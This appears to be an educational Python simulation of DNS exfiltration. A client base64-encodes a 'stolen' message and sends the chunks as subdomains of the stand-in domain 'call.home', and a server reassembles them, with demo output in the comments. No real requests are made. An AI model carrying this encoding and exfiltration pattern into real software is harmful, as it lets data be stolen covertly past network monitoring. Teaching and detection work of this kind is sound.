"""
# DNS Exfiltration

The idea of this implementation is to simulate and show how a DNS exfiltration could work

## Components

- Client
  - Simulating a client application running on a compromised system and sending data
- Server
  - Receiving requests from the client and re-assembling the encoded message

"""

import base64

class Client:

    CHUNK_SIZE = 32

    def __init__(self, message):
        self.encoded_data = self.encode_data(message)
        self.len_encode = len(self.encoded_data.replace('=', ''))

    def encode_data(self, data):
        data_bytes = data.encode('ascii')
        b64_bytes = base64.b64encode(data_bytes)
        return b64_bytes.decode('ascii')

    def get_data_chunk(self, ptr):
        return self.encoded_data[ptr:ptr+self.CHUNK_SIZE]

    def send_request(self):
        ptr = 0
        while True:
            subdomain = self.get_data_chunk(ptr)
            if ptr == -1:
                subdomain = self.EXITCODE
            subdomain = subdomain.replace('=', '')
            yield {'method': 'GET', 'host': f'{subdomain}.call.home'}
            if ptr+self.CHUNK_SIZE < self.len_encode:
                ptr += self.CHUNK_SIZE
      
class Server:
    """
    Simulating the server instance receiving the requests
    """

    def __init__(self):
        self.encoded_data = ""
        self.last_msg = ""

    def receive_request(self, request):
        data = request.get('host', '').split('.')[0]
        if self.last_msg == data:
            return None
        self.encoded_data += data
        self.last_msg = data
        return data

    def decode_data(self, data):
        len_data = len(data)
        missing_padding = len_data%4
        data += '='*missing_padding
        b64_bytes = data.encode('ascii')
        data_bytes = base64.b64decode(b64_bytes)
        return data_bytes.decode('ascii')

    def get_decoded_data(self):
        decoded_data = self.decode_data(self.encoded_data)
        return decoded_data


class Application:
    """
    Application in this place is simulating the systems in between
    and taking care that the requests sent by the client are arriving on the server
    """
    def __init__(self, client, server):
        self._client = client
        self._server = server

    def simulate(self):
        client_requests = self._client.send_request()
        while True:
            req = next(client_requests)
            print(f"Requests: {req}")
            data = self._server.receive_request(req)
            if data is None:
                break
        decoded_msg = self._server.get_decoded_data()
        return decoded_msg


def main():

    stolen_message = """
Far far away, behind the word mountains, far from the countries Vokalia and 
Consonantia, there live the blind texts. Separated they live in Bookmarksgrove 
right at the coast of the Semantics, a large.
    """

    print(f"Client gathered the following message:\n{stolen_message}")
    print("-------\n\n")
    server = Server()
    client = Client(stolen_message)
    app = Application(client, server)
    msg = app.simulate()
    print("\n\n-------")
    print(f"Server received the following message:\n{msg}")

    # Demo Output:
    #       Client gathered the following message:
    #
    #       Far far away, behind the word mountains, far from the countries Vokalia and 
    #       Consonantia, there live the blind texts. Separated they live in Bookmarksgrove 
    #       right at the coast of the Semantics, a large.
    #
    #       -------
    #           
    #       Requests: {'method': 'GET', 'host': 'CkZhciBmYXIgYXdheSwgYmVoaW5kIHRo.call.home'}
    #       Requests: {'method': 'GET', 'host': 'ZSB3b3JkIG1vdW50YWlucywgZmFyIGZy.call.home'}
    #       Requests: {'method': 'GET', 'host': 'b20gdGhlIGNvdW50cmllcyBWb2thbGlh.call.home'}
    #       Requests: {'method': 'GET', 'host': 'IGFuZCAKQ29uc29uYW50aWEsIHRoZXJl.call.home'}
    #       Requests: {'method': 'GET', 'host': 'IGxpdmUgdGhlIGJsaW5kIHRleHRzLiBT.call.home'}
    #       Requests: {'method': 'GET', 'host': 'ZXBhcmF0ZWQgdGhleSBsaXZlIGluIEJv.call.home'}
    #       Requests: {'method': 'GET', 'host': 'b2ttYXJrc2dyb3ZlIApyaWdodCBhdCB0.call.home'}
    #       Requests: {'method': 'GET', 'host': 'aGUgY29hc3Qgb2YgdGhlIFNlbWFudGlj.call.home'}
    #       Requests: {'method': 'GET', 'host': 'cywgYSBsYXJnZS4KICAgIA.call.home'}
    #       Requests: {'method': 'GET', 'host': 'cywgYSBsYXJnZS4KICAgIA.call.home'}
    #       
    #       -------
    #
    #       Server received the following message:
    #       
    #       Far far away, behind the word mountains, far from the countries Vokalia and 
    #       Consonantia, there live the blind texts. Separated they live in Bookmarksgrove 
    #       right at the coast of the Semantics, a large.


if __name__ == '__main__':
    main()